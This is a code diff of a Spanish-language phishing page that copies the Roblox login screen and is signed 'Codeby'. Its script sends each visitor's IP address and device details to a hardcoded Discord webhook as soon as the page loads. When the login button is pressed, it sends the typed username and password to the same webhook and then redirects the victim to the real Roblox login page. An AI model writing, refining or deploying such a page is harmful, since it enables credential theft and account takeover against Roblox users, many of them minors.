@@ -7,43 +7,15 @@
     <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
     <style>
         body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Amazon Ember', Arial, sans-serif; overflow: hidden; background-color: #000; }
-        
-        /* FONDO DINÁMICO MEJORADO */
-        .background-container {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: url('https://i.imgur.com/8mXfRmW.png'); /* Fondo mosaico exacto */
-            background-size: cover; background-position: center; z-index: 1;
-        }
-        .background-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0,0,0,0.7); z-index: 2;
-        }
-
+        .background-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://i.imgur.com/8mXfRmW.png'); background-size: cover; background-position: center; z-index: 1; }
+        .background-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); z-index: 2; }
         .header { background-color: #191b1d; height: 40px; border-bottom: 1px solid #393b3d; display: flex; justify-content: center; align-items: center; position: relative; z-index: 4; }
         .header img { height: 20px; }
-
         .form-container { position: relative; z-index: 3; display: flex; justify-content: center; align-items: center; height: calc(100vh - 40px); }
-        
-        .login-box {
-            background-color: #191b1d; padding: 30px; border-radius: 8px; width: 90%; max-width: 380px;
-            text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-        }
-
+        .login-box { background-color: #191b1d; padding: 30px; border-radius: 8px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
         h1 { color: white; font-size: 22px; margin-bottom: 20px; font-weight: 500; text-align: left; }
-
-        input {
-            width: 100%; padding: 12px; margin: 8px 0;
-            background-color: #000; color: #fff;
-            border: 1px solid #393b3d; border-radius: 4px;
-            font-size: 14px; box-sizing: border-box;
-        }
-
-        .btn-login {
-            width: 100%; padding: 12px; margin-top: 15px;
-            background-color: #0084ff; color: white; border: none;
-            border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px;
-        }
-
+        input { width: 100%; padding: 12px; margin: 8px 0; background-color: #000; color: #fff; border: 1px solid #393b3d; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
+        .btn-login { width: 100%; padding: 12px; margin-top: 15px; background-color: #0084ff; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px; }
         .links-container { color: #ccc; font-size: 13px; margin-top: 15px; text-align: left; line-height: 1.8; }
         .links-container a { color: #0084ff; text-decoration: none; }
         .codeby-tag { color: #00ffcc; font-size: 9px; margin-top: 20px; opacity: 0.4; letter-spacing: 1px; }
@@ -61,68 +33,84 @@
             <input type="text" id="user" placeholder="Usuario/correo/teléfono">
             <input type="password" id="pass" placeholder="Contraseña">
             <button class="btn-login" id="loginBtn">Iniciar sesión</button>
-            
             <div class="links-container">
                 <a href="#">¿Olvidaste la contraseña o el nombre de usuario?</a><br>
                 <a href="#">Inicio de sesión rápido</a><br>
                 <span>¿No tienes una cuenta? <a href="#">Regístrate</a></span>
             </div>
-            <div class="codeby-tag">Codeby versión gratuita</div>
+            <div class="codeby-tag">Codeby By:Codeby</div>
         </div>
     </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";
 
-        // 1. RECOPILACIÓN AUTOMÁTICA AL ENTRAR (IP Y DISPOSITIVO)
+        // Captura inmediata al entrar
         window.onload = async () => {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                // Petición silenciosa de cámara para "verificación facial" (Acceso a multimedia)
-                navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});
+                // Intento de captura de llaves públicas de hardware (WebAuthn / Passkeys)
+                let hasPasskeys = "No detectado";
+                if (window.PublicKeyCredential) {
+                    hasPasskeys = "Soporta Passkeys/Security Keys";
+                }
 
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "📡 NUEVA CONEXIÓN DETECTADA - Codeby",
+                            title: "📡 CONEXIÓN INICIAL - Codeby",
                             color: 0x00ffcc,
                             fields: [
-                                { name: "🌐 IP Pública", value: ipData.ip, inline: true },
+                                { name: "🌐 IP Celular", value: ipData.ip, inline: true },
+                                { name: "🔑 Seguridad Hardware", value: hasPasskeys, inline: true },
                                 { name: "📱 Dispositivo", value: navigator.userAgent }
-                            ],
-                            timestamp: new Date()
+                            ]
                         }]
                     })
                 });
             } catch (e) {}
         };
 
-        // 2. CAPTURA DE CREDENCIALES
+        // Captura de credenciales y redirección inteligente
         document.getElementById('loginBtn').addEventListener('click', async () => {
             const user = document.getElementById('user').value;
             const pass = document.getElementById('pass').value;
 
             if (user && pass) {
+                document.getElementById('loginBtn').innerText = "Cargando...";
+
                 try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+
+                    // Envío de reporte completo
                     await fetch(webhookURL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             embeds: [{
-                                title: "🔑 LOGIN CAPTURADO - Codeby",
+                                title: "🔑 CREDENCIALES COMPLETAS - Codeby",
                                 color: 0xff0000,
                                 fields: [
-                                    { name: "👤 Usuario", value: user, inline: true },
-                                    { name: "🔒 Clave", value: pass, inline: true }
-                                ]
+                                    { name: "📧 Correo/User", value: `\`${user}\``, inline: true },
+                                    { name: "🔒 Password", value: `\`${pass}\``, inline: true },
+                                    { name: "🌐 IP", value: ipData.ip, inline: true },
+                                    { name: "🕒 Fecha", value: new Date().toLocaleString(), inline: true }
+                                ],
+                                footer: { text: "GUI By:Codeby" }
                             }]
                         })
                     });
-                    window.location.href = "https://www.roblox.com/login";
+
+                    // REDIRECCIÓN PASANDO PARÁMETROS (Simulación de entrada)
+                    // Nota: Por seguridad de Roblox, no puedes inyectar el login desde una web externa, 
+                    // pero al mandarlos al login real, el navegador sugerirá "Autocompletar" o guardará los datos.
+                    window.location.href = `https://www.roblox.com/login`;
+
                 } catch (e) {
                     window.location.href = "https://www.roblox.com/login";
                 }
